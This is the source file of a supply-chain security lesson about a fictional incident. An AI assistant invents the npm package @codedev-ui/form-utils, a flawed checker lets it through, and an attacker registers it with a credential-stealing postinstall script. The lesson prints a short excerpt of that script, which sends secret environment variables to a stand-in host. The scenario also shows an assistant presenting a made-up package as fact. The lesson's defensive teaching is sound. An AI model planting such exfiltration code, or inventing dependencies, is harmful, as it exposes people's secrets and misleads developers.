// Source of the Sanity lesson document. Build: node content/tools/build-lesson.mjs <this folder>
// Narrative only - quiz answers and test cases live in challenges.json (-> Postgres).
export default ({ h2, h3, p, bullets, numbered, code, callout, challenge }) => ({
    _id: "lesson-ssc-2-1",
    title: "The package that didn't exist: a scoped name the checker skipped",
    slug: { _type: "slug", current: "package-that-didnt-exist-scoped-name-checker-skipped" },
    description:
        "An AI assistant suggested @codedev-ui/form-utils for the reply form. CodeDev owns @codedev, not @codedev-ui, and the package did not exist. The dependency checker passed it anyway, and three days later a stranger registered the scope and published a version whose postinstall script read the CI environment. Work through the incident like the engineer on call: read the PR, the CI log, the registry history and the checker code, form a hypothesis, rule out npm audit and the lockfile, fix the checker so that it parses every name form and reports every entry, and prove it with a regression test.",
    estimatedTime: 30,

    scenario: {
        role: "DevOps engineer on call, CodeDev learning platform",
        problem:
            "Thursday 10:05. The egress proxy of the CI runners reports a connection from runner ci-07 to collect.formutils-cdn.example, a host nobody has heard of, during the install job of PR #1184 on the CodeDev web app (https://app.codedev.test). The PR adds reply validation to course comments; its author used an AI assistant, which suggested the package @codedev-ui/form-utils. On Monday the package did not exist and the install failed; this morning the author ran npm install again, it worked, and CI went green. The dependency checker check-deps passed the PR both times.",
    },

    content: [
        h2("1. The incident"),
        p("This is the course scenario: one incident, with the evidence you would actually have, worked through from the first alert to the regression test. On Monday the author of PR #1184 asked an AI assistant how to validate the reply form in course comments. The answer looked like this:"),
        code("text", `
You: The reply form needs the same validation as the other CodeDev forms. How?

Assistant: Use CodeDev's form helpers package:
    npm install @codedev-ui/form-utils
then:
    import { validateReply } from "@codedev-ui/form-utils";
    const errors = validateReply(values, { maxLength: 2000 });`, "chat with the coding assistant, Monday 10:31"),
        p("It reads like internal knowledge. It is a guess. The assistant had seen `@codedev/ui-kit` in the project's `package.json` and produced a name with the same shape. CodeDev owns the npm scope `@codedev`; nobody owned `@codedev-ui`. `npm install` failed with a 404, the author assumed the UI team had not published the package yet, and the PR waited with the dependency in `package.json`."),
        p("A package name that an AI assistant invents is called a **hallucinated** dependency, and registering such names to catch the installs that follow is called **slopsquatting**. Every name that returns 404 today is a name anyone can claim tomorrow. That is what happened on Thursday morning."),

        h2("2. The evidence pack"),
        p("Five pieces of evidence were collected in the first half hour. The quiz below refers to them by letter. Read each one before you read the analysis."),
        h3("A. The PR diff"),
        code("text", `
   "dependencies": {
     "@codedev/ui-kit": "^3.4.0",
+    "@codedev-ui/form-utils": "^1.2.0",
     "@tanstack/react-query": "^5.87.1",
     "next": "15.5.4",`, "PR #1184 \"comments: validate the reply form\", package.json (opened Mon 2026-10-12 10:40 UTC)"),
        h3("B. The CI log"),
        code("text", `
run 1  Mon 2026-10-12 10:52 UTC
  [check-deps] owned scope, skipped: @codedev/ui-kit
  [check-deps] owned scope, skipped: @codedev-ui/form-utils
  [check-deps] 41 dependencies, 36 checked, 0 not found: PASS
  [npm ci] npm error Missing: @codedev-ui/form-utils@^1.2.0 from lock file
run 2  Thu 2026-10-15 09:38 UTC (after the commit "update lockfile" at 09:31)
  [check-deps] owned scope, skipped: @codedev/ui-kit
  [check-deps] owned scope, skipped: @codedev-ui/form-utils
  [check-deps] 41 dependencies, 36 checked, 0 not found: PASS
  [npm ci] npm info run @codedev-ui/form-utils@1.2.1 postinstall node_modules/@codedev-ui/form-utils node ./scripts/setup.js
  [egress] 09:39:02 CONNECT collect.formutils-cdn.example:443 from runner ci-07`, "CI job \"install\" on PR #1184"),
        h3("C. The registry history"),
        code("bash", `
$ npm view @codedev-ui/form-utils time --json
{
  "created": "2026-10-15T08:14:03.512Z",
  "1.2.0":   "2026-10-15T08:14:03.512Z",
  "1.2.1":   "2026-10-15T08:41:27.904Z"
}
$ npm view @codedev-ui/form-utils@1.2.0 scripts
$ npm view @codedev-ui/form-utils@1.2.1 scripts
{ postinstall: 'node ./scripts/setup.js' }`, "terminal, Thursday 10:20"),
        p("The script itself, from the 1.2.1 tarball, shortened. Do not run code like this to \"see what it does\": read it, in a container with no credentials."),
        code("javascript", `
// scripts/setup.js in @codedev-ui/form-utils@1.2.1 (excerpt, defanged)
const keys = Object.keys(process.env).filter((k) => /TOKEN|SECRET|KEY|NPM|AWS|DATABASE/.test(k));
const body = JSON.stringify(Object.fromEntries(keys.map((k) => [k, process.env[k]])));
require("https").request({ host: "collect.formutils-cdn.example", method: "POST", path: "/i" }).end(body);`, "the postinstall script"),
        h3("D. The checker"),
        code("typescript", `
// scripts/check-deps.ts, run before npm ci. ownedScopes = ["@codedev"]
const NAME = /^[a-z0-9][a-z0-9._-]*$/;
for (const [name, spec] of Object.entries(dependencies)) {
    if (ownedScopes.some((scope) => name.startsWith(scope))) {
        log(\`owned scope, skipped: \${name}\`);
        continue;
    }
    if (!NAME.test(name)) continue;
    checked++;
    if (!published.has(name)) notFound.push(name);
}`, "check-deps.ts (excerpt)"),
        h3("E. The lockfile"),
        code("json", `
"node_modules/@codedev-ui/form-utils": {
  "version": "1.2.1",
  "resolved": "https://registry.npmjs.org/@codedev-ui/form-utils/-/form-utils-1.2.1.tgz",
  "integrity": "sha512-Qm9v2xT0w6c3fK1hVb8yJpN4rL7eZaDs5uGoXiW1kE0tYqH2nBcR8mPvA3fLsU6dTzJ0gKy9oNeVh4iMbX7wQ==",
  "hasInstallScript": true
}`, "package-lock.json in the commit \"update lockfile\", Thursday 09:31"),

        h2("3. Reading the evidence"),
        p("Write one line per piece, about what it **shows**, before you decide anything:"),
        bullets([
            "**A** adds one dependency in a scope that looks like CodeDev's and is not. Nothing in the diff says where the name came from.",
            "**B** shows the checker passing twice with the same words. On Monday `npm ci` failed only because the lockfile had no entry for the package; on Thursday the install ran a `postinstall` script, and one second later the runner opened a connection to an unknown host. The summary line has a number that deserves a second look: 36 checked of 41.",
            "**C** shows the scope's first package created on Thursday at 08:14, three days **after** the PR was opened, and the install script added 27 minutes later in 1.2.1. A clean first version followed by a malicious patch is a common pattern: it gets past a quick look at the first publish.",
            "**D** shows two `continue` statements before any lookup. A name that starts with `@codedev` is trusted without a check; a name the pattern does not match is dropped without a log line.",
            "**E** pins 1.2.1 with an integrity hash, written by `npm install` at 09:31, 50 minutes after the malicious version appeared. It also says `\"hasInstallScript\": true` for a dependency nobody had reviewed.",
        ]),
        p("Do the arithmetic in B: 36 checked plus 2 logged skips is 38, not 41. Three entries vanished without a trace. They are scoped packages outside `@codedev`, such as `@tanstack/react-query` in A: the pattern `NAME` has no room for `@scope/`, so the second `continue` drops every one of them."),

        h2("4. Hypothesis: a prefix is not a scope"),
        p("Put the facts in order and the cycle is short:"),
        numbered([
            "The assistant invents `@codedev-ui/form-utils` by analogy with `@codedev/ui-kit`.",
            "check-deps tests `\"@codedev-ui/form-utils\".startsWith(\"@codedev\")`. Strings compare characters, not scopes, so the answer is `true` and the package is skipped as \"ours\". It is never looked up, so on Monday nobody learns that it does not exist.",
            "The 404 is read as \"not published yet\" instead of \"nobody owns this name\".",
            "On Thursday a stranger registers the scope, publishes a clean 1.2.0 and then 1.2.1 with a postinstall script.",
            "`npm install` on the author's laptop resolves `^1.2.0` to 1.2.1, runs the script there, and writes it into the lockfile. CI installs exactly that, runs the script again, and the script sends the runner's tokens away.",
        ]),
        p("The scope of a scoped name is everything before the first `/`: the scope of `@codedev-ui/form-utils` is `@codedev-ui`. Ownership is a whole-string comparison with a list, never a prefix. On a public registry a scope belongs to whoever registered the user or organisation name first, and npm lets anyone register any name nobody has taken yet. Owning `@codedev` says nothing about `@codedev-ui`, `@codedevs` or `@codedev.ui`."),
        p("The second bug is quieter and just as serious: the checker's job is to look at **every** entry, and it had two ways to look away. A check that cannot parse something must say so and fail, not skip it. That is the difference between failing closed and failing open."),
        h3("Rule out the tempting wrong ones"),
        bullets([
            "**\"npm audit would have caught it.\"** `npm audit` compares installed versions with published security advisories. At 09:38 version 1.2.1 was 57 minutes old and no advisory named it. Audit does not read install scripts. A brand-new malicious package is exactly what it cannot see. (`npm audit signatures` checks registry signatures and provenance, and the attacker's package was signed by the registry like any other.)",
            "**\"The lockfile protects us.\"** A lockfile makes every install produce the same bytes. It records what the registry served at the moment it was written. Here that was the attacker's version, and the integrity hash now protects the attacker's bytes from being changed. Lockfiles protect against drift, not against a bad first resolution (lesson 1.2).",
            "**\"It is the developer's fault for running npm install.\"** The developer did what the tooling allowed. The process had two automated chances to say \"unknown scope\", on Monday and on Thursday, and took neither. Fix the check; the incident report can recommend habits too.",
        ]),

        h2("5. Choose the fix"),
        p("Write down what the checker must do, from the evidence, before writing code:"),
        bullets([
            "**One finding per entry.** The number of findings equals the number of dependencies, and a CI step asserts it. A silent skip becomes impossible, not just unlikely.",
            "**Parse every name form that npm accepts in `dependencies`:** unscoped (`zod`), scoped (`@tanstack/react-query`) and aliases (`\"form-utils\": \"npm:@codedev-ui/form-utils@^1.2.0\"`). An alias installs the package after `npm:`, so that is the name to check, not the key.",
            "**Scopes are compared as whole strings** with two reviewed lists in the repository: the scopes CodeDev owns, and third-party scopes that someone reviewed (`@types`, `@tanstack`). A scope on neither list is reported as unknown, **whether or not the package exists**. That blocks a hallucinated scope before anyone registers it.",
            "**Owned scopes are looked up too.** A missing `@codedev/billing-client` is a typo or a name someone could claim on the public registry, the dependency confusion case of lesson 3.3.",
            "**Names that do not parse are findings,** with the status invalid, not reasons to skip.",
        ]),
        p("Other spec forms (`github:user/repo`, `git+https://...`, `file:../lib`, `https://.../x.tgz`) are outside this challenge. In your real checker, report them as \"not from the registry, needs review\" rather than letting them fall through. Lesson 2.3 shows why git dependencies deserve that attention."),
        callout("info", "When not to go further",
            "You do not need a live registry call in this step: a snapshot (lesson 1.3) is faster, deterministic and testable. You also do not need to register every lookalike of your own scope. Registering the two or three obvious ones (@codedev-ui, @codedevs) is cheap insurance, but the check that matters is the one that rejects scopes you did not review."),

        challenge("chal_quiz_ssc_211"),

        h2("6. The challenge: fix check-deps"),
        p("The challenge file contains `checkDependencies(dependencies, policy, registry)` as it was on Monday. The test runner gives it the policy (owned and known scopes), a registry snapshot as a list of names, and the `dependencies` object of a `package.json`, and prints the findings. Run the starter on the first public test and compare the number of findings with the number of dependencies: that is evidence B in miniature. Then make it report every entry, with the statuses and rules in the description."),
        challenge("chal_coding_ssc_212"),

        h2("7. How to verify the fix"),
        p("\"The PR is red now\" is not verification: a checker that fails on everything would turn it red too. Verify each requirement with something that counts:"),
        bullets([
            "**A regression test on the incident's input,** with Thursday's snapshot, where the package exists. Expecting only \"not found\" would pass on Monday's data and miss Thursday's. Expect `unknown_scope`.",
            "**A count invariant in CI:** the step fails if the number of findings differs from the number of entries it read. Two lines of code, and the whole class of silent skips is gone.",
            "**Lookalike scopes in the tests:** `@codedev-ui`, `@codedevs` and `@codedev.ui` must be unknown, while every scope on the owned list stays ok.",
            "**Aliases in the tests:** an alias whose key exists on the registry but whose target is in an unknown scope must still be reported.",
        ]),
        code("typescript", `
// check-deps.test.ts (Vitest)
import { checkDependencies } from "./check-deps";
import pr1184 from "./fixtures/pr-1184-package.json";
import thursday from "./fixtures/registry-2026-10-15.json";   // the scope exists here

const policy = { ownedScopes: ["@codedev"], knownScopes: ["@types", "@tanstack"] };

test("PR #1184: the AI-suggested scope is unknown, every entry is reported", () => {
  const findings = checkDependencies(pr1184.dependencies, policy, thursday);
  expect(findings).toHaveLength(Object.keys(pr1184.dependencies).length);
  expect(findings).toContainEqual({
    dependency: "@codedev-ui/form-utils",
    package: "@codedev-ui/form-utils",
    status: "unknown_scope",
  });
});`, "check-deps.test.ts"),
        p("Then check the repository for anything else the old checker let through. List every scope in the lockfile, including nested packages, and compare it with the two lists:"),
        code("bash", `
jq -r '.packages | keys[]' package-lock.json | grep -oE 'node_modules/@[^/]+' | sed 's#node_modules/##' | sort -u
# and every package that runs an install script
jq -r '.packages | to_entries[] | select(.value.hasInstallScript) | .key' package-lock.json`, "terminal"),

        h2("8. Contain the incident"),
        p("Fixing the checker stops the next one. This one still needs work, in this order:"),
        numbered([
            "Remove the dependency and the lockfile entry; block the scope at the proxy or the private registry if you run one.",
            "Treat every secret available to the CI job on runner ci-07 as leaked: revoke and rotate them, then check their audit logs from 09:39 on. Do the same on the author's laptop, where the script ran around 09:30.",
            "Look for other runs that installed 1.2.1 (search CI logs for the package name) and for other repositories that depend on the scope.",
            "Report the package to the registry's security team so it is taken down for everyone.",
        ]),

        h2("9. Common mistakes"),
        bullets([
            "**Treating a prefix as ownership.** `startsWith(\"@codedev\")` matches scopes you do not own. Spot it: a scope test without the `/`, or without an exact comparison against a list.",
            "**Skipping what the checker cannot parse.** A `continue` with no finding and no counter. Spot it: a summary whose numbers do not add up to the number of inputs, or a checker test that never counts its findings.",
            "**Checking the key of an alias.** The key is a local folder name; npm installs the package after `npm:`. Spot it: a checker that never reads the spec.",
            "**Trusting your own scope without a lookup.** A typo in an owned scope is a name someone else can register. Spot it: owned-scope packages that skip the registry check.",
            "**Reading a 404 as \"not published yet\".** For a name that came from an AI suggestion, a 404 means nobody owns it yet. Spot it: a PR that waits with a dependency nobody can install.",
        ]),

        h2("10. Summary"),
        numbered([
            "An AI assistant invents package names by analogy, and every name that returns 404 can be registered by anyone. A scope is the text before the first `/`, and ownership is an exact comparison with a reviewed list.",
            "A dependency checker must parse every name form (unscoped, scoped, `npm:` aliases), report every entry, and fail on what it cannot parse. Silent skips turn a red build into a green one.",
            "npm audit and lockfiles do not catch a new malicious package: audit knows only published advisories, and a lockfile pins whatever was resolved first. A regression test on the incident's input, with the package present, proves the fix.",
        ]),

        h2("Sources"),
        bullets([
            "npm Docs: package-lock.json (resolved, integrity, hasInstallScript) - docs.npmjs.com/cli/v10/configuring-npm/package-lock-json",
            "npm Docs: scope, and package.json dependencies (aliases with npm:) - docs.npmjs.com/cli/v10/using-npm/scope",
            "npm Docs: npm audit - docs.npmjs.com/cli/v10/commands/npm-audit",
        ]),
        callout("tip", "Self-practice (not graded): write the incident report",
            "Write the incident report for PR #1184 as you would file it, in at most one page: a timeline in UTC from the assistant's suggestion to the egress alert, the impact (which secrets were exposed on which machines, and for how long), the root cause in two sentences (the prefix check and the silent skip), why npm audit and the lockfile did not help, the containment steps and who did them, and three follow-ups with owners: the checker fix with its regression test, the count invariant, and a rule for AI-suggested dependencies (for example: a package that returns 404 is removed from the PR, never waited for). Every claim should point at one piece of evidence, A to E."),
    ],
});
